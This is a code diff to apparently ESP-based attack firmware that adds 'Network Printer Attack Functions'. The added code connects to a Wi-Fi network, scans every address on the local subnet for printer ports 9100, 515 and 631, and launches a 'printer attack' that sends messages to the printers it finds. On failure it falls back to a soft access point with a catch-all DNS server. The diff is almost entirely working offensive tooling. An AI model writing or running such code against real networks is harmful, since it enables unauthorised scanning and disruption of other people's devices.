@@ -733,9 +733,35 @@ void stopCombined() {
 }
 
 // Network Printer Attack Functions
+bool connectToNetwork(String ssid, String password) {
+  Serial.println("Connecting to network: " + ssid);
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(ssid.c_str(), password.c_str());
+  
+  int attempts = 0;
+  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
+    delay(500);
+    Serial.print(".");
+    attempts++;
+  }
+  
+  if (WiFi.status() == WL_CONNECTED) {
+    Serial.println("\nConnected! IP: " + WiFi.localIP().toString());
+    return true;
+  } else {
+    Serial.println("\nFailed to connect to network");
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
+    dnsServer.start(DNS_PORT, "*", APIP);
+    return false;
+  }
+}
+
 void scanNetworkPrinters() {
   if (!WiFi.isConnected()) {
     Serial.println("Not connected to network");
+    discoveredPrinters = "Error: Not connected to network";
     return;
   }
   
@@ -743,25 +769,36 @@ void scanNetworkPrinters() {
   IPAddress localIP = WiFi.localIP();
   String subnet = String(localIP[0]) + "." + String(localIP[1]) + "." + String(localIP[2]) + ".";
   
+  Serial.println("Scanning subnet: " + subnet + "1-254");
   Serial.println("Scanning for network printers...");
   
+  int found = 0;
   for (int i = 1; i < 255; i++) {
     String targetIP = subnet + String(i);
     WiFiClient client;
     
-    // Check common printer ports
+    // Check common printer ports with timeout
+    client.setTimeout(1000);
     if (client.connect(targetIP.c_str(), 9100) || 
         client.connect(targetIP.c_str(), 515) || 
         client.connect(targetIP.c_str(), 631)) {
       discoveredPrinters += targetIP + "\n";
       Serial.println("Printer found: " + targetIP);
+      found++;
       client.stop();
     }
     delay(10);
+    
+    // Progress indicator
+    if (i % 50 == 0) {
+      Serial.println("Scanned " + String(i) + "/254 addresses...");
+    }
   }
   
-  if (discoveredPrinters.length() == 0) {
-    discoveredPrinters = "No printers found";
+  if (found == 0) {
+    discoveredPrinters = "No printers found on network " + subnet + "0/24";
+  } else {
+    Serial.println("Found " + String(found) + " printer(s)");
   }
   Serial.println("Printer scan complete");
 }
@@ -804,6 +841,12 @@ void printToPrinter(String printerIP, String message) {
 
 void startPrinterAttack() {
   if (printerAttackActive) return;
+  
+  if (!WiFi.isConnected()) {
+    Serial.println("Error: Not connected to any network. Connect first.");
+    return;
+  }
+  
   printerAttackActive = true;
   printerMessage = "SECURITY TEST - Unauthorized network access detected!\nPrinter: " + WiFi.localIP().toString() + "\nTime: " + String(millis()/1000) + "s";
   
